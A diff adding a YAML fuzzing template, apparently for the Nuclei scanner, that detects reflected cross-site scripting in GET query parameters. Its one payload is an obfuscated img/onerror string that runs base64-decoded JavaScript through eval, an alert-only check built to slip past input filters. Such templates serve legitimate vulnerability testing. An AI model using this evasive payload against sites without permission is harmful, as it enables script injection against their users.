@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-custom-payload
+
+info:
+  name: Custom Reflection XSS Detection with Escaped Payload
+  author: netbaan
+  severity: high  # Increase severity due to potential impact
+  description: |
+    This template is designed to detect reflection XSS vulnerabilities using a specific payload that exploits image tags.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Only run on GET requests
+
+    payloads:
+      reflection:
+        - "<img%09'%0asrc='%5c%0d%7c'%00=''onerror=%0d%09%0a%60%60.sup(eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYW5pKQ==')))>"  # Note the need to escape single quotes
+
+    stop-at-first-match: true 
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
